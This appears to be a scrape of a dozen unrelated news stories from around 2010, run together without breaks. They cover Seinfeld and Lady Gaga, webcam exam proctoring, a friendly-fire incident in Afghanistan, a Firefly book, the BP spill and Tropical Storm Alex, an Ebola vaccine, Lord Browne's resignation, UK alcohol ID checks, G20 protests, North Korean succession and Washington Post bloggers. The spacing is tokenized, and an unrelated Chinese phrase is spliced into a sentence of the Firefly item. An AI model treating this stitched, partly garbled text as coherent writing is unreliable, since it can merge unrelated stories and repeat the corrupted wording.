What does Jerry Seinfeld think about Lady Gaga , who wound up in his box at Citi Field two weeks ago ?
" This woman 's a jerk .
I hate her , " Seinfeld said at the end of a WFAN radio interview with Steve Somers on Monday , and it's hard to tell if he 's joking .
" I can't believe they put her in my box , which I paid for . "
The scantily - clad Gaga was moved from her front - row seat to Seinfeld 's empty box and gave photographers the bird .
" You give people the finger and you get upgraded ?
Is that the world we 're living in now ? " he said .
" She is talented .
I do n't know why she 's doing this stuff . "
Seinfeld , 56 , also said when asked about the June 10 incident , " I wish her the best .
You take one ' A ' off of that and you 've got gag .
I do n't know what these young people think or how they promote their careers . "
New technology allows students to sit tests at home while computer lock , webcam and microphone ensure they can't cheat
It has long been said that exams should be sat in comfort – in loose - fitting clothing and with a glass of water handy .
Now scientists have taken this a step further and found a way for students to take tests from their bedrooms at any time of day or night .
At least one UK university – the University of Wales Institute , Cardiff – is experimenting with the technology , which has built in anti-cheating software , and dozens of others will be offered the service this summer .
It has been developed by the US firm Software Secure Inc and works through a unit that students plug into their computers .
Once a student feels ready to sit the written exam , the technology takes a fingerprint to check their identity and a 360 - degree webcam and microphone kick into action .
Throughout the exam , these pick up whether the student is trying to cheat by receiving help from others .
The computer also " locks down " so that the student cannot search the internet or their files for answers .
University invigilators can then watch the footage , whenever they choose to .
Some may decide to watch each individual student taking their exam , while others will only view a sample of candidates , or speed through the footage to check nothing looks suspicious .
The technology , called Securexam Remote Proctor , is already used by New York University 's law faculty , the University of West Alabama and other US institutions .
It will be offered to universities later this month at an international plagiarism conference hosted by Northumbria University .
The University of Wales Institute , Cardiff is already looking into using the technology for its overseas students .
Mark Pelling , the senior learning development officer at the university , said he had been impressed , adding that it acted in the same way as a normal invigilator .
" This could change the way we do assessment , " he said .
" We are very convinced by this and we think it is probably a very effective way of invigilating . "
However , there were still some questions over whether a student would be able to thwart the system and cheat and how it would be possible , logistically , to send thousands of students the unit , he said .
With record numbers of students at university , institutions struggle to find an exam hall big enough to fit every candidate .
The technology would solve this problem and save on the cost of hiring invigilators , Pelling said .
Douglas Winneg , Software Secure 's founder , said the technology would help disabled students and those who live in remote areas to take their exams and would make employers less sceptical about distance learning courses .
Kate Byford , the senior policy adviser on disability at the Equality Challenge Unit , which helps universities to cater for all students , said she welcomed practical measures to develop " alternative approaches to assessment " .
However , she said universities needed to think about whether an exam was an appropriate way to measure a student 's knowledge in the first place .
" Offering a range of assessment methods ensures that more students get the opportunity to perform at their best , " she said .
" By anticipating students ' needs and implementing different and flexible assessment methods , institutions are actively demonstrating their commitment to inclusion for all students . "
Aaron Porter , president - elect of the National Union of Students , said the technology " could be one solution to problems faced by those who might have difficulty reaching a university campus for their exams , such as disabled students or long - distance learners " .
But he warned against using it as an excuse to further cut costs by reducing the amount of contact time students have with staff .
" No technology is completely infallible and it is crucial to ensure the fairness and integrity of assessment is maintained for all students . "
Kabul , Afghanistan ( CNN ) -- German forces with the NATO - led command killed at least five Afghan soldiers in northern Afghanistan in a friendly fire incident , the German military said Saturday .
Friday night 's killings in Kunduz province came hours after three German troops died and eight others were wounded in fighting with the Taliban in the same area , the military said .
The German army regards that fight as one of the " most grave and costly " incidents for the military since World War II , a military spokesman said .
The German military said five Afghan soldiers were killed Friday night , but the Afghan Defense Ministry said six died in the flare - up .
The German troops were on their way to replace other soldiers when two civilian vehicles moved toward them and did n't stop , the German military said .
As a result , an artillery tank opened fire on the vehicles , the ministry said .
After the shooting , the troops learned the vehicles were carrying Afghan soldiers .
Afghanistan 's Defense Ministry said Afghan soldiers were carrying food to troops in the Khakani village of Chardara district of Kunduz province when German soldiers shot them by mistake .
" This loss of life during difficult operations is tragic , and we share condolences with all those who lost loved ones yesterday , said Brig .
Gen. Eric Tremblay , NATO 's International Security Assistance Force spokesman .
" We work extremely hard to coordinate and synchronize our operations , and incidents such as this hurt these efforts .
We deeply regret the loss of lives from our Afghan partners . "
The NATO - led command and Afghan Defense Ministry were investigating .
Germany has 4,335 soldiers serving in Afghanistan .

Joss Whedon's Firefly was an inspiration in so many ways , but one of them was its innovative approach to depicting spaceships and space travel .
Here are some exclusive concept art images from a new book that celebrates Firefly 's enduring inspiration .
If you 've ever wanted to crawl inside the world of Firefly , both the universe that the characters live in and the behind - the - scenes world of making the show , then Firefly : Still Flying is a must - read .
The new book , from Titan Books , takes you inside the universe in a few different ways :
1 ) There is just shit - tons of details on the making of the show , including a huge section on the props .
Like the Lassiter ?
That gun that Mal plans to steal in the episode " Trash " ?
It was made out of an old 1980s flashlight attached to the metal mold of the hand grip from a plastic toy gun from the 1960s , bolted together — but it was n't made for Firefly — it was an old prop , which the show rented from a prop rental house .

There are also storyboards for the huge battle sequence in " Serenity , " which look like you could blow them up into panels from the most epic war comic ever made .
You also get a sense of what a transformation this show represented in the way everybody depicts space travel and life aboard a spaceship .
And there are features on the show 's costumes , stunts , and of course the ships .
2 ) The people involved with making the show talk you through it .
There are loads of quotes and essays about the making of the show , many of them old but new to me , and probably you as well .
You can totally feel the love that went into the show , and the extent to which it became a family just in its short time on the air .
And then you also get plenty of stuff about the way Firefly 's fans became part of the family .
Chances are you already knew this show and its follow - up movie were something special — but in case you 'd forgotten , this book will remind you something powerful .
Oh , and apparently Nathan Fillion kidnapped a monkey .
Because he 's that guy .

3 ) There 's original fiction from the writers of the show , including Jose Molina , Jane Espenson and ( in satirical comic - book form ) Ben Edlund .
Espenson 's story , about Kaylee and Wash being stuck in a nasty situation on the brink of death , really does feel like it could be the bones of an unaired episode of the show .
Meanwhile , Molina 's story is sort of an epilogue to the TV series and movie , and it would be spoilery to give away much more than that .
Suffice to say , Mal 's decision at the end of Serenity turns out to have had profound consequences for the whole surviving crew of his ship , and nobody 's life was the same afterwards .
So if you still want to visit the ' Verse , see the old stories in a new way and take in some new stories as well , you ought to pick up Firefly : Still Flying , in non-驴粪蛋上下了霜 bookstores everywhere .
And here 's some exclusive spaceship concept art .

New Orleans , Louisiana ( CNN ) --
Oil companies Shell and BP began evacuating nonessential personnel from their drilling platforms in the Gulf of Mexico on Saturday as officials kept a wary eye on a tropical storm churning toward Mexico that could wreak havoc on oil spill cleanup efforts .
As much as 2.5 million gallons of oil could flow into the Gulf for two weeks if Tropical Storm Alex forces a work stoppage at the ruptured BP well , the government 's disaster response manager said .
Adm .
Thad Allen said gale - force winds near the well head would prompt an evacuation of the thousands of workers and vessels involved in the oil recovery and cleanup effort .
Both Shell and BP were taking precautions ahead of the storm .
About 300 people were evacuated from Shell 's production platforms and drilling rigs Saturday , company spokesman Bill Tanner said , adding that evacuations will continue Sunday .
BP began similar evacuations Saturday from three of its rigs in the far south of the Gulf , spokesman Neil Chapman said .
He noted that the evacuations do not include anyone involved in the Deepwater Horizon response efforts .
If Alex forces a stoppage in cleanup , however , Allen said it would take 14 days to put everything back in place .
That means the containment cap would be off for that period , allowing oil to flow freely .
Researchers have estimated that between 35,000 barrels -- about 1.5 million gallons -- and 60,000 barrels -- about 2.5 million gallons -- of oil are gushing into the ocean every day .
Anxiety levels rose Saturday as Alex churned toward Mexico with a potential for hurricane - force winds in the coming days .
The latest computer models show the predicted path of the storm passing well south of the United States , making landfall in Mexico as a hurricane in the middle of the week , according to the National Weather Service .
If it continues on its predicted track , the storm would not directly pass over oil - affected areas -- but forecasters have not ruled out an easterly shift in Alex 's path .
" We all know the weather is unpredictable , and we could have a sudden last - minute change , " Allen said .
Alex -- the first named storm of what is expected to be a fierce Atlantic hurricane season -- formed in the Caribbean on Saturday and had maximum sustained winds near 65 mph .
It was heading toward Belize and Mexico 's Yucatan Peninsula .
Allen said it would take five days to evacuate more than 38,000 people and 6,000 vessels that are involved in the oil response as well as the two rigs that are collecting about 24,500 barrels of oil a day from the well , Allen said .
He told CNN there is " no playbook " when it comes to responding to a massive oil spill as a storm brews .
" But I will tell you there 's been an extraordinary amount of planning being done , " he said .
BP plans to place a third rig called the Helix Producer at the well site next week , which will increase the amount of oil being captured to 53,000 barrels a day , Allen said .
That , too , could be disrupted if Alex affects the area .
Gulf Coast residents feared that high winds and storm surges could spread the slick and push more oil ashore into bays , estuaries and pristine beaches , exacerbating the oil disaster triggered by BP 's ruptured well .
" The greatest nightmare with this storm approaching is that it takes this oil on the surface of the Gulf and blows it over the barrier islands into the bays and the estuaries , " Sen .
Bill Nelson , D - Florida , told CNN .
" And that is where you really get the enormous destruction , because it 's just very difficult to clean up those pristine bays . "
Also Saturday , Americans took to beaches from coast to coast to protest offshore oil drilling .
They held hands and formed lines in the sand .
" I believe Americans need to stand together and take our energy future back from the grip of the oil industry , " said Dave Rauschkolb , a restaurant owner from Seaside , Florida , who founded Hands Across the Sand .
Deepwater drilling could resume by the end of July after U.S. District Judge Martin Feldman in New Orleans , Louisiana , on Thursday denied a request to keep a six - month moratorium imposed by President Barack Obama on May 27 in place , pending a government appeal .
The government has 30 days to show it is beginning to comply with Feldman 's order and start issuing permits .
The appeals process can continue , but until the appeal , the government must act as if Feldman 's order will be upheld .
While protesters lined the sand , Alex moved toward Mexico , no one knowing whether it would make a sudden turn north into the open Gulf .
CNN meteorologist Karen Maginnis said the " preferred scenario " actually would be for Alex to head to northern Florida .
That 's because the oil spill has been gradually rotating counterclockwise .
If the storm heads to the east of it , it would send the oil farther out to sea .
If the storm heads more directly towards the central Gulf and Louisiana , it might push the oil toward Florida .
" We 've never been in this situation before , " Maginnis said .
" We 've never seen an oil spill that encompassed the Gulf like this , end up so close to shore . "
A powerful storm would also complicate efforts to clean up miles of coastline .
" It 's going to mean we 're going to have to find a way to maneuver all our resources , change things , " said Grover Robinson , chairman of the Escambia County Commission in Pensacola , Florida .
" We wo n't be able to fight the oil for a couple of days .
And we have no idea about winds and current and what it will do to the oil in the gulf .
So obviously , it 's a very big concern for us . "
Allen said he and some top Obama administration officials , including Vice President Joe Biden , will be headed back to the Gulf region next week to assess the oil relief efforts .
CNN 's Chuck Johnston , Brandon Miller , T.J. Holmes and Moni Basu contributed to this report .
New research has found that an experimental Ebola vaccine developed by researchers at the National Institutes of Health protects monkeys against not only the two most lethal Ebola virus species for which it was originally designed , both recognized in 1976 , but also against a newer Ebola virus species that was identified in 2007 .
Nancy J. Sullivan , Ph.D. , of the Vaccine Research Center at the National Institute of Allergy and Infectious Diseases ( NIAID ) , NIH , led the study team , which included collaborators from the U.S. Army Medical Research Institute of Infectious Diseases in Fort Detrick , Md , and the Centers for Disease Control and Prevention in Atlanta .
Their findings appear May 20 in the open- access journal PLoS Pathogens .
Currently , there are no specific treatments or vaccines available to control Ebola outbreaks .
" The important work by Dr. Sullivan and her colleagues shows that it is possible to generate immunity to newly identified species of Ebola virus with a vaccine originally designed to protect against a different species , " says NIAID Director Anthony S. Fauci , M.D. " This finding will guide future vaccine design and may open an avenue for developing a single vaccine that works against both known and emerging Ebola virus species . "
The experimental Ebola vaccine being developed at NIAID has two components , a prime and a boost .
The prime consists of a DNA vaccine containing a small piece of genetic material encoding surface proteins from Zaire ebolavirus and Sudan ebolavirus .
The boost consists of a weakened cold virus that delivers the Zaire ebolavirus surface protein .
Previously , Dr. Sullivan and her collaborators demonstrated that the prime - boost strategy produces a strong antibody response in monkeys .
More importantly , the experimental vaccine induces a robust reaction by the cellular arm of the immune system .
The cellular arm includes T cells , which help orchestrate the overall immune response .
" An ideal Ebola vaccine would stimulate broad immunity so that we would n't have to scramble to create entirely new vaccines whenever new virus species are identified , " notes Dr. Sullivan .
However , developing one vaccine to protect against multiple Ebola virus species poses a challenge , she says .
To the antibody - producing arm of the immune system , each species looks different .
Neutralizing antibodies that recognize one Ebola species cannot readily recognize , or cross-neutralize , the others .
T cells , in contrast , can cross-react , even when the target viruses share only small pieces in common .
After the emergence of Bundibugyo ebolavirus ( BEBOV ) in 2007 , Dr. Sullivan 's team decided to revisit the prime - boost vaccine regimen to see if the cellular immunity generated would confer protection against the new virus species .
Four cynomolgus macaques received the DNA prime vaccine .
A year later , the animals were boosted with the vector vaccine .
Shortly after the boost , the four vaccinated monkeys and four unvaccinated ones serving as controls were exposed to lethal levels of BEBOV .
All the unvaccinated animals became ill , and three died .
None of the vaccinated animals showed any sign of illness .
Analysis showed that the vaccinated monkeys developed T - cell responses sufficient to prevent or control infection by the novel Ebola virus species , even though the vaccine did not contain material from BEBOV and no antibodies against BEBOV were produced .
The animal study was conducted in maximum - level biosafety containment laboratories at U.S. Army Medical Research Institute of Infectious Diseases .
Now the research team is evaluating what parts of the T - cell response were critical to the vaccine 's success against BEBOV .
" Once we identify those critical aspects , we can design future vaccines to better elicit that desired immune cell - based activity and perhaps make a single vaccine that protects against all Ebola virus species , " says Dr. Sullivan .

The mystery surrounding the case of a lifelong post office employee who vanished at work and turned up dead at a dump hours later deepened Tuesday when Hayward police said she had been slain .
An autopsy revealed that Nancy Rogers , 61 , of Fremont was a homicide victim , police said .
They declined to release any specifics about how she died or other details about the case , saying it could compromise the investigation .
Lord Browne 's resignation was a " tragedy " BP said .
Lord Browne said he had stepped down to save BP from embarrassment after a newspaper won a court battle to print details of his private life .
He also apologised that statements he had made in legal documents about a four - year relationship with Jeff Chevalier had been " untruthful " .
Lord Browne had planned to step down from the company in July .
He will be replaced by his nominated successor Tony Hayward .
I deny categorically any allegations of improper conduct relating to BP

As a result of the decision , Lord Browne will lose at least £ 3.5 m of his retirement package - and possibly a further £ 12 m , BP said in a statement .
BP said it had accepted Lord Browne 's resignation with " deepest regret " .
' Private life '
" In my 41 years with BP I have kept my private life separate from my business life .
I have always regarded my sexuality as a personal matter , to be kept private , " Lord Browne said in a statement .
" It is a matter of deep disappointment that a newspaper group has now decided that allegations about my personal life should be made public . "
He confirmed that he did have a relationship with Mr Chevalier who had now decided to tell his story to Associated Newspapers - owners of the Mail on Sunday .
However , he added : " These allegations are full of misleading and erroneous claims .
In particular , I deny categorically any allegations of improper conduct relating to BP . "
Lord Browne has been hoist on the petard of how he tried to block Mr Chevalier 's interview

Lord Browne went to the House of Lords to try to win permission to appeal against earlier rulings which followed private hearings in the High Court and the Court of Appeal that would allow some details to be published .
The outgoing boss said that he had initially lied to the court about the circumstances in which he had met Mr Chevalier , because of " embarrassment and shock " at the revelations .
High Court judge , Lord Justice Eady said that he was not allowed to make allowances for the " white lie " told by Lord Browne .
Under fire
BBC Business Editor Robert Peston called the resignation a " sad end to what was , until recently , a distinguished career " .
He added that there probably were bigger blows to Lord Browne 's reputation , such as an explosion at the Texas refinery that killed BP workers and led to stinging criticism of the firm .
Lord Browne had been at the helm of the company for more than a decade , however in recent months he had come under fire over the company 's safety culture and his huge retirement package .
It is a tragedy that he should be compelled by his sense of honour to resign in these painful circumstances
Peter Sutherland
BP Chairman
He had been due to leave BP with a £ 5.3 m pay - off in July and a £ 21.7 m pension , as well as millions of pounds in shares due under the incentive plan - a move many investors opposed .
Because of his decision to leave the firm early he will forfeit a significant chunk of those earnings .
BP chairman Peter Sutherland said that a review into allegations that company assets and resources had been abused were " unfounded or insubstantive " .
" It is a tragedy that he should be compelled by his sense of honour to resign in these painful circumstances , " he added .
The Mail on Sunday said that it was Lord Browne who had " made his private life a public issue " by lying in court .
" We would like to reiterate that the story we originally sought to publish was a business story involving issues of great importance to shareholders and employers of BP , " the paper said .
Shares in BP barely moved on news of Lord Browne 's resignation .
Analysts said that this was largely because the outgoing boss was already on his way out and that his successor was ready to step straight into the top job .

National identity cards may have been scrapped , but that does n't mean you do n't need to carry other forms of ID .
An increasing number of people - some in their 30s and 40s - are being asked for proof of age when buying alcohol .
Why ?
At the age of 36 , twice as old as the youngest legal drinkers , Kay was surprised to be challenged for proof of age when buying her groceries in a Tesco in east London .
" About two years ago , all of a sudden , every time I went to buy alcohol , a bottle of wine with my shopping , they would ask me for ID . "
ID 'D IN THEIR 30s I was standing next to a friend as she bought a bottle of wine at a supermarket , and we both had to provide ID .
It 's terrible that it is presumed you intend to break the law unless you can prove otherwise
Janine Moohan , 31 , Glasgow ( right ) Kay 's European health insurance card , with her name and date of birth but no photograph , was not acceptable .
So on several occasions , the wine went back on the shelf , until she started taking her passport with her .
" I know you 're meant to feel happy that people think you 're younger but when you think about it , they are accusing you of lying and of stealing [ someone 's ID ] . "
Others have had a similar experience .
Headlines were made when a 72 - year - old was unable to buy two bottles of Cabernet Sauvignon at Morrisons in Blackpool because he could not prove his age .
Ironically , it 's concern about under - age drinking that is responsible .
A few years ago , before and after the licensing laws were relaxed , newspapers were full of pictures of " Binge drink Britain " - young people lying prostrate on the street or fighting in town centres on a Saturday night .
BARMAID'S VIEW Gemma Barua , 28 , manager of Wetherspoon in Batley , West Yorks , says anyone who looks under 21 is asked Staff wear badges informing customers that they will ask They also log every time they do Training videos teach staff how to ask with sensitivity Sometimes customers lose their temper , but overall attitudes have improved , says Gemma Since then , the penalties for pubs , supermarkets and off - licences that sell alcohol to people aged under 18 have increased from £ 10,000 to £ 20,000 , with the added threat of a six - month prison term .
In January , a " two strikes " policy was introduced which means publicans automatically have their licences reviewed if they twice fall foul of under - age sting operations by serving minors posing as customers .
The individual employee serving a minor faces an £ 80 fine .
Also this year , the last government made it mandatory for publicans to be members of schemes like Challenge 21 and Challenge 25 ( also Think 21 and Think 25 ) , which means that customers who look as much as three or seven years above the minimum legal age must be asked to provide proof of age .
A million people a month are being turned away for either not having proof of age or because they are under age
Mark Hastings
Beer and Pub Association
There are only three acceptable forms of identification , which are a driving licence , a passport or a form of ID approved by the Proof of Age Standards Scheme ( PASS ) .
And every time someone is asked for ID , it is logged by bar staff .
An increased number of test purchases reflects the greater scrutiny that licensed premises are under .
Serve Legal , a commercial company which carries out test purchases at the request of licensees , made 3,907 visits in 2007 but that rose four - fold to 24,587 last year .
During that time the proportion of pubs passing the checks has nearly doubled from 40 % to 75 % .
' More American '
The whole climate surrounding proof of age has changed in the last few years , says Mark Hastings of the Beer and Pub Association , which represents two - thirds of pubs in the UK .
But awareness of the new rules is very high , he says .
" A recent survey showed 90 % of 18 - to 21 - year - olds knew about Challenge 21 and have experienced a much more rigorous approach to ID checks .
YOU LOOK 25 , ANY ID ?
Tesco Asda Morrisons Marks and Spencer Co-Op Sainsbury 's
All these supermarkets demand proof of age for people who look 25 or under " And we know from the monitoring we do with the pubs , that a million people a month are being turned away for either not having proof of age or because they are under age . "
We are moving towards the US culture , often commented on , where it 's absolutely common to be asked for ID wherever you go , says Mr Hastings .
If you 're 21 or under , you should expect to be asked for ID , therefore carry some .
But he questions whether the penalties are fair .
" Should you be sent to prison for inadvertently serving a drink to someone who is 17 ?
Six months in prison is more than some people get for bashing a granny in the street .
" The word here is probably ' disproportionate ' , although we have no problem with any government focusing on this as an important issue and ensuring proof of age is rigorously enforced . "
Gangs of youths Caroline Nodder , editor of trade newspaper The Publican , says supermarkets and off - licences are catching up with pubs , now that the media has put the issue of under - age drinking on to the agenda .
" There has been a lot of press about pubs , a lot of examples of people lolling in the gutter .
Pubs unfairly get the blame , but they are the public face of drinking and they will get the blame for social aspects of drinking .
Youngsters drinking in public is a common sight " Pubs are the safest place to go and have a drink but cheap alcohol is available through the off - trade .
A £ 4 pint in a pub precludes most under - age drinkers but you do see gangs of youths hanging around with bottles and cans .
" Is it that much of an inconvenience to carry ID ?
If as a society we want to stop access to alcohol then we have to put up with this . "
It 's not very British to carry a passport with you , she says , but there are other acceptable forms of identity .
" I would love to be ID'd but I do n't think it 's going to happen . "
But not everyone thinks this is a welcome development .
Four readers who were asked for ID
These increasing checks on people buying alcohol is part of a wider crackdown on individual freedoms , says Josie Appleton of the Manifesto Club , which campaigns against what it sees as the " hyperregulation " of everyday life and is conducting a survey on this issue .
" People in their late 30s have been asked for ID for ridiculous things like barbecue skewers and Christmas crackers .
It 's part of a bigger illiberal trend that means people having to go out with passports on them .
" When I was young , you had to look about 18 if you went to the pub and it was n't the worst thing in the world if a 17 - year - old bought a can of lager .
There was no social collapse .
We 've got things out of proportion . "
BRITISH TOURIST IN THE US
The drinking age is 21 and you can understand them being cautious but that is ludicrous
Mark Esdale , 51 , after being told by a waitress in Utah that everyone who looked under 50 is asked In France , teenagers are taught to use alcohol responsibly but in the UK , the regime has led to the isolation of youths , who instead drink on park benches and behave like idiots , says Ms Appleton .
It 's part of the infantilisation of adults , she says , always having to prove whether you can handle what you are buying .
" In a culture of constant surveillance , everyone is thought to be a risk and everyone is thought to be potentially incapable , incompetent or abusive . "
For those 20 and 30 - somethings a little unhappy about carrying their ID , they can comfort themselves that in some parts of the world , their parents would have to as well .
Ms Nodder saw her 60 - year - old father being asked for proof he was over 21 when in Kentucky in the US on holiday recently .
And in a letter to the Magazine 's Monitor , Mark Esdale , 51 , said that a waitress in a Utah restaurant last week told him she demanded proof of age from everyone who looked under 50 .
Below is a selection of your comments .
I was ID'd a couple of months ago for buying 16 paracetamol .
From what I understand , you have to be 16 to buy it ... at the time , I was 34 .
It was probably the second time in my whole life that I have been ID'd , both times were when I was over the age of 18 .
I laughed , asked her if she was joking , stammered I was 34 and then showed her my driving licence , which was thankfully in my purse .
I agree that people need to be ID'd to buy certain products , but from my ( limited ) experience , it seems that staff need some serious training .
Hetty , London , UK I was asked my age in the local Spar shop a few months ago , and I am 68 .
It made my day .
Jeff , Cleethorpes
I 've been into a local pub to get a cooked lunch - on the doors it says over 18s only ( Never used to and I do n't think it does anymore ) I go in with a couple of friends and we order our food and some soft drinks to go with it .
I get ID 'd but my friends do n't - in the end I had to go home and get my passport just so I could have a hot meal .
I 've not been back since .
Natasha , Bangor
How times have changed , I remember back in the 1970's when it was no problem to by alcohol at 14 from pubs , clubs and off licences .
Carol Partington , Nether Poppleton , York
My ex-husband started drinking the alcohol his parents kept at home at the age of 11 .
Because he was tall for his age he was able to buy his own from the age of 14 .
He died aged 47 last month from the effects of acute alcoholism .
Maybe he would still be here no if he'd been asked for ID from the age of 14 .
Nicky , UK I was working in Texas once a few years ago , and decided to buy some beer from the petrol station near our hotel .
They asked for ID , but refused to accept my passport because it was " foreign " .
Obviously being a foreigner , I was unable to provide them with American ID , so I got in an argument with the manager , before another customer tapped me on the shoulder to say he had bought the beer for me .
While me being ID 'd was n't unexpected ( I was 27 ) , my 55 - year - old colleague was very unimpressed when they asked him for ID , and refused his passport as well !
He went and shouted at our hotel receptionist until he went and got him beer that the hotel paid for by way of apology !
Rich Bradley , London , UK I can tell you that here in the US , even the strict carding of young adults does not stop under - age drinking .
Youths can still get alcohol from older family members and friends -- just look at the party culture in most US high schools and colleges .
If you really want to stop young people from drinking , then it makes more sense to teach responsibility than completely restricting alcohol altogether .
Kristen , Virginia , USA
It seems that bar staff and cashiers are given greatest responsibility for beating underage drinking and up - holding the law .
If they fail to do so , however , they face a penalty for little more than wrongly judging someone 's age .
They have a role to play , certainly , although IDing people aged 35 and above is ridiculous .
I 'm unclear on the repercussions for under - age drinkers who get caught but they are the ones knowingly breaking the law .
They may be underage , but if they 're prepared to make that choice , they should also be prepared to be held to account somehow .
Anne Malcolm , London
As someone who used to work in the off - trade ( and a licence holder ) , I can see both sides of the coin .
The problem is , as the seller there 's an £ 80 fine if you make a mistake .
The business itself can get a fine in the thousands with the designated premises supervisor potentially getting sent down for six months .
To make it even less fair on the staff , when you ask for ID you get abused .
People seem to think that verbally abusing you is a good way to make you change your mind .
It 's a sad state of affairs to be in , but perhaps it 's time people thought to actually take ID for age restricted products .
You can claim it 's ridiculous that you should have to , and as someone who has been asked for ID when buying glue gun sticks ( quite what I could do with them is n't clear ) I 'm not going to disagree with you .
But it is the world we live in .
Ben Tasker , Ipswich
As a licensee , the penalties for serving under - age drinkers make it risky to employ a judgment - based ID policy , so the alternative is a blanket U - 21 or U - 25 policy .
In the states , this has gone to extremes , but where do you draw the lines ?
In the US ( where I used to live ) most people carry their driving license anyway , and those over the age of 30 are often quite flattered to be asked to prove they are over 21 !
James , Swindon , UK
My girlfriend aged 28 , an art teacher , can't get served at my local Tesco even though she can provide a French ID National ID card which has a picture on it with her date of birth .
This card is accepted by UK border control but not by the supermarkets ( are n't we supposed to be in the EU ? )
Naz Islam , Pontypridd S - Wales I 'm 15 and I 've never been ID 'd buying alcohol
John D , Nottingham
I work in a local co-op and we are constantly under the threat of " test shoppers " sent in by the police or local council that are 17 but look much older to catch us out .
We ask everyone who looks under 25 not only because its the law but if we do get caught out the £ 80 fine that we would personally have to pay out of our own pocket is more than most of us earn in a week .
I 'm not interested in serving children alcohol and support the law but I do feel very sorry for people who are around the age of 25 - 35 but look younger who i have to refuse sales to just because they have no ID .
As usual the penalties in this country are too harsh for the majority of us they obey the law and the innocent get punished again .
Emma Walker , Fareham , Hampshire I have to say I do n't see the benefits of challenging people for their ID .
It does n't stop young people drinking because they will always find someone older to buy them a can or two of beer .
Plus a lot of the binge drinkers who cause trouble on the weekend are not youths but young adults over the legal drinking age .
I think people should be taught how to be responsible and people who cause disruption should be punished .
One time I was ID'd when buying a DVD .
The man said it was store policy but I 'd never heard of anyone being ID'd for a DVD before .
I never went back to that store and buy my DVDs online where no one can bother me or preach to me .

news The G20’s Alternative Opening Ceremonies
A crowd waits outside Massey Hall before the Council of Canadian ’s “ Shout Out for Social Justice ! ” event .
Last night , a series of anti-G20 speakers took the stage at Massey Hall to tell us what ’s wrong with the world .
Hosted by the the Council of Canadians , “ Shout Out for Global Justice ! ” featured an impressive list of speakers that included Dr. Vandana Shiva , Amy Goodman , Naomi Klein , and Maude Barlow .
“ Shout Out for Global Justice ! ” was a political pep -talk — the protest movement ’s more - or - less official opening ceremonies .
The Raging Asian Women ( RAW ) started the show with a Taiko drum performance , which led into a three - hour agree - a - thon , complete with ready applause and standing ovations .
This was the anti-G20 contingent ’s best shot at creating some sort of an identity , and the speeches indeed captured some common themes .
Good : the Cochabamba accord , Indigenous rights , water as a human right , employment , and the environment .
Bad : BP , militarization , the criminalization of dissent , the tar sands ( “ Canada ’s Mordor “ ) , the WTO , the IMF , the fake lake , and the World Bank .
Also bad : the police presence throughout the city .
But the main evil last night was the G20 itself .
Security monitors the box office outside of Massey Hall before the event .
All speakers argued that the G20 is illegitimate and unaccountable .
Rousing the sympathetic crowds , Barlow , chair of the Council of Canadians , said we should just “ scrap this damn summit . ”
Still , the general protest movement seems undecided about the endgame — should the G20 change its agenda , or should the G20 go away ?
Since it ’s already a forum of power , should we use it , or lose it ?
The biggest hit of the night was local girl Klein , who complained about the effect the summit is having on the city , saying , “ I ’d take the garbage strike over the G20 any day of the week . ”
She then invited the audience to follow her down to Allan Gardens after the event to support the nascent tent city .
And did they .
About half of the audience spilled out into the street and spent their renewed political energy on a solidarity march up to the Allan Gardens tent city , chanting slogans and staring down the police officers who slowly accumulated to monitor the march .
( Only a few , mild altercations resulted . )
The humble tent city was a bit stunned to receive so many visitors , who began chanting “ G8 ! G20 !
They few !
We many ! ”
The megaphones came out , and protesters were invited to stay the night .
A few dozen pop -up “ red tents ” had been set up for some sleepers , while others sat strumming guitars in the grass .
Some basic planning had gone into the site : there was water , food , a medic tent , a contingent of security guards , and “ mental medics . ”
Established bathroom facilities were the one amenity noticeable by their absence .
Before people made their trek to tent city , Klein took the mic and congratulated the audience for choosing to participate .
The police were n’t prepared for the protest , she said , because they were “ surprised that a bunch of middle - class people who would pay twenty dollars to go to an event would do something like that . ”
The protest movement disagrees with some very disagreeable things .
The event ’s speakers drew on the long narrative of capitalism — militarization , commodification , de-regulation — as fuel for the protest movement ’s weekend of dissent .
This broad banner , along with the goal of scrapping the G20 , is an ambitious agenda that at times last night seemed like a catch - all for anger and general dissatisfaction .
( See our more in - depth comments on protesters . )
As political movements go , it ’s hard to pin this one down to a concrete issue and a concrete solution .
Footage from “ Shout Out for Global Justice ! ” is available at Rabble ‘s website .

Image caption Kim Jong-il is thought to have had a stroke in 2008
North Korea 's ruling communist party is to hold a rare meeting of its political bureau , state media have said .
The session will be held in September to select new leaders for the Workers ' Party of Korea ( WPK ) , the North Korean Central News Agency said .
Analysts say the move may signal a transition of power in the secretive country .
Leader Kim Jong-il is believed to be in ill health and grooming one of his sons , Kim Jong - un , to succeed him .
The meeting is " for electing [ the party 's ] highest leading body reflecting the new requirements of the WPK " , the announcement said .
" We are now faced with the sacred revolutionary tasks to develop the WPK ... into an eternal glorious party of Kim Il - sung and further increase its militant function and role to glorify the country as a great prosperous and powerful socialist nation . "
Growing role
Kim Jong - il took over as leader from his father , North Korea 's founder Kim Il- sung , after his death in 1994 .
With Kim Jong - il thought to be in ill health following a suspected stroke in 2008 , analysts believe the conference will be held to elevate the status of his third son , Swiss - educated Kim Jong-un .
Earlier this week the director of South Korea 's National Intelligence Service said that the 27 - year - old is already taking a role in policy - making and frequently accompanies his father on inspection tours .
The BBC's John Sudworth in Seoul says Kim Jong - il himself began his official role to succeed his father by assuming a senior party position at a convention in 1980 .
Anniversary tension
The announcement comes a day after the 60th anniversary of the beginning of the three - year war between North and South Korea .
It also follows a warning from the United States to North Korea to refrain from " actions that increase tensions in the region , " amid concerns that Pyongyang may be preparing a new round of missile tests .
The US state department said it was aware North Korea had issued a nine - day ban on shipping off its western coast .
Tensions between North and South Korea have increased following the 26 March sinking of a South Korean warship , which an international investigation concluded was sunk by a torpedo from a North Korean submarine .

You may remember this from a few months ago -- the Washington Post wanted to create a network of local bloggers to provide content for the Washington Post .
It was an unpaid gig , but bloggers would offer up a couple of paragraphs on the Post website , and readers could click through to the blogger 's site to read the rest of the piece .
Well , it has n't turned out that way .
But merely reprinting and linking to existing blog content is not the Post ’s goal .
Their real intention is to direct the bloggers to provide content that would only appear on the Post ’s website .
And the Post has been emailing its bloggers non -stop to get them to provide this free and exclusive work .
Click through the link above to read the Post 's orders to the bloggers .
In short , the Post has created a " workflow plan " requiring the bloggers to be on call on certain dates to provide original content , it 's encouraging them to do original reporting , and it 's even begun assigning stories to them .
It ’s obvious what ’s going on here .
The Post has absolutely no intention of driving traffic to independent blogs .
